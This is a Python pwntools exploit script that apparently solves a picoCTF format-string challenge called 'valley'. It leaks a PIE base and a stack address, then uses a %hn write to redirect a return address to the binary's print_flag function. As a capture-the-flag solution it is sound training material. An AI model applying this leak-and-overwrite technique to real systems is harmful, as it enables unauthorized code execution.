#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 60824
HOST = "shape-facility.picoctf.net"
exe = context.binary = ELF('./valley', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*echo_valley+218
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

#Stage 1: Leak exe_base

fmt = b"%21$p"
p.sendlineafter(b"Shouting: \n", fmt)
p.recvuntil(b"distance: ")
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x1413
log.info("exe_base: " + hex(exe.address))

#Stage 2: Leak stack_pointer_rip
fmt = b"%9$p"
p.sendline(fmt)
p.recvuntil(b"distance: ")
stack_leak = int(p.recvline()[:-1], 16)
stack_main = stack_leak + 0x30
log.info("stack_leak: " + hex(stack_leak))
log.info("stack_main: " + hex(stack_main))

# #Stage 3: Overwrite main+18 -> print_flag

print_flag = exe.sym.print_flag+5 & 0xffff
# GDB()

fmt = f"%{print_flag}c%10$hn".encode()
pl = flat(
	fmt.ljust(0x20, b"A"),
	stack_main,
	)

p.sendline(pl)
p.sendline(b"exit")

p.interactive()
